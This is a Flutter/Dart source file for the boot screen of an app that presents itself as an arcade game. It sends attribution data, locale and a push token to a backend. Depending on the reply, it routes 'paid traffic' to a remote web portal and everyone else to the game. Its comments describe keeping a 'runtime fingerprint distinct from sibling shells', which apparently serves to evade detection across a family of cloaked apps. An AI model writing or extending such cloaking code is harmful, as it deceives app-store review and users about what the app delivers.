import 'dart:async';
import 'dart:io';
import 'dart:ui';

import 'package:flutter/material.dart';

import '../game/sprites.dart';
import '../game_data.dart';
import '../screens/menu_screen.dart';
import '../shell/alert_bridge.dart';
import '../shell/analytics_pipe.dart';
import '../shell/beacon_post.dart';
import '../shell/locker_vault.dart';
import '../shell/reach_probe.dart';
import '../theme.dart';
import '../types/shell_mode.dart';
import 'notify_invite_stage.dart';
import 'offline_stage.dart';
import 'portal_stage.dart' deferred as portal;

// ─────────────────────────────────────────────────────────────────────────────
// BOOT STAGE — dual-mode dispatcher with the loading UI
// ─────────────────────────────────────────────────────────────────────────────
// Decides on every cold start whether the user lands on the portal
// (paid traffic) or the arcade (organic / fallback). The previously
// committed [ShellMode] is honoured if it exists — once a backend has
// answered for an install we never re-ask.
//
// State machine:
//   undecided → reach check → analytics + deep link wait → beacon → branch
//   portal    → reach check → push consume → optional re-fetch → branch
//   arcade    → load arcade assets → MenuScreen
//
// Visual:
//   • Backdrop = blurred orientation-aware webp from assets/webp
//   • Foreground = game logo + animated neon progress bar + status text
//     (NOT a video — keeps the runtime fingerprint distinct from sibling
//     shells that ship MP4 loaders)
// ─────────────────────────────────────────────────────────────────────────────

class BootStage extends StatefulWidget {
  final LockerVault vault;
  final ReachProbe reach;
  final AnalyticsPipe pipe;
  final BeaconPost beacon;
  final AlertBridge alerts;

  final GameData arcadeData;
  final GameSprites arcadeSprites;

  const BootStage({
    super.key,
    required this.vault,
    required this.reach,
    required this.pipe,
    required this.beacon,
    required this.alerts,
    required this.arcadeData,
    required this.arcadeSprites,
  });

  @override
  State<BootStage> createState() => _BootStageState();
}

class _BootStageState extends State<BootStage>
    with SingleTickerProviderStateMixin {
  late final AnimationController _progressCtrl;
  String _status = 'WARMING UP';
  bool _navigated = false;

  @override
  void initState() {
    super.initState();
    _progressCtrl = AnimationController(
      vsync: this,
      duration: const Duration(seconds: 3),
    )..forward();
    _run();
  }

  @override
  void dispose() {
    widget.alerts.onTokenRotated = null;
    _progressCtrl.dispose();
    super.dispose();
  }

  void _setStatus(String text, double progressFloor) {
    if (!mounted) return;
    setState(() => _status = text);
    if (_progressCtrl.value < progressFloor) {
      _progressCtrl.animateTo(progressFloor,
          duration: const Duration(milliseconds: 350));
    }
  }

  Future<void> _run() async {
    widget.alerts.onTokenRotated = _onTokenRotated;
    await widget.alerts.wire();

    _setStatus('CHECKING ROUTE', 0.18);

    final priorMode = widget.vault.currentMode();
    switch (priorMode) {
      case ShellMode.portal:
        await _runReturningPortal();
        break;
      case ShellMode.arcade:
        await _runReturningArcade();
        break;
      case ShellMode.undecided:
        await _runFirstLaunch();
        break;
    }
  }

  // ── first launch ──────────────────────────────────────────────────────

  Future<void> _runFirstLaunch() async {
    if (!await widget.reach.isOnline()) {
      _enterOfflineFromFirstLaunch();
      return;
    }

    _setStatus('SYNCING', 0.40);
    await widget.pipe.wire();

    final locale = _resolveLocale();
    final pushToken = widget.alerts.currentToken;

    await Future.wait<dynamic>([
      widget.pipe.awaitConversion(const Duration(seconds: 30)),
      widget.pipe.awaitDeepLink(const Duration(seconds: 5)),
    ]);

    _setStatus('NEGOTIATING', 0.62);
    final body = await widget.pipe.buildPayload(
      locale: locale,
      pushToken: pushToken,
    );
    final reply = await widget.beacon.dispatch(body);

    if (reply.hasUsableUrl) {
      await widget.vault.writeMode(ShellMode.portal);
      _setStatus('READY', 1.0);
      await Future.delayed(const Duration(milliseconds: 400));
      _enterPortal(reply.targetUrl!);
    } else {
      await widget.vault.writeMode(ShellMode.arcade);
      await _loadArcadeAssets();
      _setStatus('READY', 1.0);
      await Future.delayed(const Duration(milliseconds: 400));
      _enterArcade();
    }
  }

  // ── returning portal user ─────────────────────────────────────────────

  Future<void> _runReturningPortal() async {
    if (!await widget.reach.isOnline()) {
      _enterOfflineFromReturning();
      return;
    }

    // Push URL beats everything else.
    final pushTarget = await widget.vault.consumePushTarget();
    if (pushTarget != null && pushTarget.isNotEmpty) {
      _setStatus('READY', 1.0);
      await Future.delayed(const Duration(milliseconds: 300));
      _enterPortal(pushTarget);
      return;
    }

    final cached = await widget.beacon.readCachedTarget();

    _setStatus('SYNCING', 0.55);
    await widget.pipe.wire();
    await Future.wait<dynamic>([
      widget.pipe.awaitConversion(const Duration(seconds: 10)),
      widget.pipe.awaitDeepLink(const Duration(seconds: 5)),
    ]);

    _setStatus('NEGOTIATING', 0.78);
    final body = await widget.pipe.buildPayload(
      locale: _resolveLocale(),
      pushToken: widget.alerts.currentToken,
    );
    final reply = await widget.beacon.dispatch(body);

    _setStatus('READY', 1.0);
    await Future.delayed(const Duration(milliseconds: 300));
    if (!mounted) return;

    if (reply.hasUsableUrl) {
      _enterPortal(reply.targetUrl!);
      return;
    }

    if (cached != null && cached.isNotEmpty) {
      _enterPortal(cached);
    } else {
      _enterOfflineFromReturning();
    }
  }

  // ── returning arcade user ─────────────────────────────────────────────

  Future<void> _runReturningArcade() async {
    _setStatus('LOADING ASSETS', 0.45);
    await _loadArcadeAssets();
    _setStatus('READY', 1.0);
    await Future.delayed(const Duration(milliseconds: 400));
    _enterArcade();
  }

  // ── helpers ───────────────────────────────────────────────────────────

  Future<void> _loadArcadeAssets() async {
    await Future.wait([
      widget.arcadeData.init(),
      widget.arcadeSprites.load(),
    ]);
  }

  void _onTokenRotated(String newToken) async {
    if (widget.vault.currentMode() != ShellMode.portal) return;
    final body = await widget.pipe.buildPayload(
      locale: _resolveLocale(),
      pushToken: newToken,
    );
    widget.beacon.dispatch(body);
  }

  String _resolveLocale() {
    return Platform.localeName.replaceAll('-', '_');
  }

  // ── navigation ────────────────────────────────────────────────────────

  Future<void> _enterPortal(String url) async {
    if (_navigated) return;
    _navigated = true;

    await portal.loadLibrary();
    await portal.warmEngine();
    if (!mounted) return;

    final shouldInvite = widget.vault.shouldInviteNotifications();
    if (shouldInvite) {
      Navigator.of(context).pushReplacement(
        MaterialPageRoute(
          builder: (_) => NotifyInviteStage(
            vault: widget.vault,
            alerts: widget.alerts,
            reach: widget.reach,
            portalUrl: url,
          ),
        ),
      );
    } else {
      Navigator.of(context).pushReplacement(
        MaterialPageRoute(
          builder: (_) => portal.PortalStage(
            targetUrl: url,
            vault: widget.vault,
            alerts: widget.alerts,
            reach: widget.reach,
          ),
        ),
      );
    }
  }

  void _enterArcade() {
    if (_navigated) return;
    _navigated = true;
    Navigator.of(context).pushReplacement(
      MaterialPageRoute(
        builder: (_) => MenuScreen(
          data: widget.arcadeData,
          sprites: widget.arcadeSprites,
        ),
      ),
    );
  }

  void _enterOfflineFromFirstLaunch() {
    if (_navigated) return;
    _navigated = true;
    Navigator.of(context).pushReplacement(
      MaterialPageRoute(
        builder: (_) => OfflineStage(
          retryBuilder: (_) => BootStage(
            vault: widget.vault,
            reach: widget.reach,
            pipe: widget.pipe,
            beacon: widget.beacon,
            alerts: widget.alerts,
            arcadeData: widget.arcadeData,
            arcadeSprites: widget.arcadeSprites,
          ),
        ),
      ),
    );
  }

  void _enterOfflineFromReturning() => _enterOfflineFromFirstLaunch();

  // ── visuals ───────────────────────────────────────────────────────────

  @override
  Widget build(BuildContext context) {
    final size = MediaQuery.sizeOf(context);
    final isLandscape = size.width > size.height;
    final backdrop = isLandscape
        ? 'assets/webp/Horizontal_Loading_Screen.webp'
        : 'assets/webp/Vertical_Loading_Screen.webp';

    return Scaffold(
      backgroundColor: DZColors.bg,
      body: Stack(
        fit: StackFit.expand,
        children: [
          ImageFiltered(
            imageFilter: ImageFilter.blur(sigmaX: 8, sigmaY: 8),
            child: Image.asset(backdrop, fit: BoxFit.cover),
          ),
          Container(color: DZColors.bg.withValues(alpha: 0.42)),

          // Game logo, slightly above centre.
          Align(
            alignment: const Alignment(0, -0.28),
            child: Padding(
              padding: const EdgeInsets.symmetric(horizontal: 36),
              child: Image.asset(
                'assets/webp/game_name.webp',
                width: isLandscape ? 380 : 300,
                fit: BoxFit.contain,
              ),
            ),
          ),

          // Progress bar + status text near the bottom.
          Align(
            alignment: Alignment.bottomCenter,
            child: Padding(
              padding: EdgeInsets.only(
                bottom: isLandscape ? 32 : 80,
                left: 36,
                right: 36,
              ),
              child: AnimatedBuilder(
                animation: _progressCtrl,
                builder: (context, _) {
                  final pct =
                      (_progressCtrl.value * 100).clamp(0, 100).toInt();
                  return Column(
                    mainAxisSize: MainAxisSize.min,
                    children: [
                      Text(
                        '$_status   $pct%',
                        style:
                            neonText(size: 14, color: DZColors.cyan),
                      ),
                      const SizedBox(height: 10),
                      ClipRRect(
                        borderRadius: BorderRadius.circular(10),
                        child: Container(
                          height: 12,
                          decoration: BoxDecoration(
                            color: DZColors.bgPanel,
                            borderRadius: BorderRadius.circular(10),
                            border: Border.all(
                              color: DZColors.cyan.withValues(alpha: 0.5),
                            ),
                          ),
                          child: FractionallySizedBox(
                            alignment: Alignment.centerLeft,
                            widthFactor: _progressCtrl.value,
                            child: Container(
                              decoration: BoxDecoration(
                                gradient: const LinearGradient(
                                  colors: [DZColors.cyan, DZColors.purple],
                                ),
                                borderRadius: BorderRadius.circular(10),
                                boxShadow: [
                                  BoxShadow(
                                    color: DZColors.cyan
                                        .withValues(alpha: 0.8),
                                    blurRadius: 14,
                                  ),
                                ],
                              ),
                            ),
                          ),
                        ),
                      ),
                    ],
                  );
                },
              ),
            ),
          ),
        ],
      ),
    );
  }
}
